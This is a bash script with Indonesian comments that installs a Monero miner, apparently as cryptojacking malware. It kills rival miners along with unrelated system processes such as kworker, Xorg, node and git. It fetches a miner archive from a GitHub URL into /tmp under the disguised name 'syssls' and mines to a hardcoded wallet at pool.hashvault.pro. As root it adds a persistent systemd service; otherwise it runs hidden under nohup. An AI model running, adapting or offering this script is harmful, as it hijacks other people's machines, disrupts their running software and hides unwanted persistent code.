#!/bin/bash

# Daftar nama proses miner yang ingin dibunuh
ps -ef|awk '/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|syssls|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' |xargs kill -9
echo "Semua proses miner yang ditemukan telah dibunuh."

# Pindah ke direktori /tmp
cd /tmp

# Mendapatkan nama sistem operasi
OS=$(uname)
hostnamets=$(uname -n)
if [[ -f "/tmp/syssls" ]]; then
    echo "File syssls ditemukan, siap dieksekusi."
else
    echo "File syssls tidak ditemukan, proses unduhan."
    if [[ "$OS" == "FreeBSD" ]]; then
        # Download dan ekstrak freebsd.tar.gz dari GitHub
        if command -v curl &> /dev/null; then
            curl -L https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/freebsd.tar.gz | tar zx
        elif command -v wget &> /dev/null; then
            wget -O - https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/freebsd.tar.gz | tar zx
        else
            echo "curl dan wget tidak tersedia. Tidak dapat mengunduh file."
            exit 1
        fi
    else
        # Download dan ekstrak syssls.tar.gz dari GitHub
        if command -v curl &> /dev/null; then
            curl -L https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz | tar zx
        elif command -v wget &> /dev/null; then
            wget -O - https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz | tar zx
        else
            echo "curl dan wget tidak tersedia. Tidak dapat mengunduh file."
            exit 1
        fi
    fi
fi

# Mendapatkan alamat IP publik VPS
if command -v curl &> /dev/null; then
    IP_PUBLIC=$(curl -s http://ipecho.net/plain)
elif command -v wget &> /dev/null; then
    IP_PUBLIC=$(wget -qO- http://ipecho.net/plain)
else
    echo "curl dan wget tidak tersedia. Tidak dapat mengambil IP publik."
    exit 1
fi

# Mendapatkan alamat IP lokal VPS
IP_LOCAL=$(hostname -I | awk '{print $1}')

# Mengganti titik dengan hubung pada IP publik dan lokal
IP_PUBLIC_REPLACED=$(echo "$IP_PUBLIC" | sed 's/\./-/g')
IP_LOCAL_REPLACED=$(echo "$IP_LOCAL" | sed 's/\./-/g')
HOSTNAME_REPLACED=$(echo "$hostnamets" | sed 's/\\./-/g')

# Menentukan apakah IP publik adalah IPv6
if [[ "$IP_PUBLIC" =~ : ]]; then
    # Jika IPv6, gunakan IP lokal
    IP_TO_USE=$IP_LOCAL_REPLACED
else
    # Jika IPv4, gunakan IP publik
    IP_TO_USE=$IP_PUBLIC_REPLACED
fi

# Output hasil
echo "IP yang digunakan (dengan tanda hubung): $IP_TO_USE"

# Cek apakah user saat ini adalah root atau bukan
if [ "$(id -u)" -eq 0 ]; then
    # Jika root, buat dan aktifkan service systemd
    echo -e "[Unit]
Description=ACIL
After=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=15s
ExecStart=/tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass VPS-$IP_TO_USE --donate-level 5 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/acil.service

    chmod 644 /etc/systemd/system/acil.service
    systemctl daemon-reload
    systemctl enable acil.service
    systemctl start acil.service

    echo "Systemd service untuk ACIL telah dibuat, dimuat, dan dimulai."
    echo "Worker : VPS-$IP_TO_USE"
else
    # Jika bukan root, jalankan dengan nohup
    nohup /tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass $HOSTNAME_REPLACED --donate-level 5 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > /tmp/.logacil 2>&1 &
    echo "Menjalankan miner sebagai user non-root dengan nohup."
    echo "Worker : $HOSTNAME_REPLACED"
fi
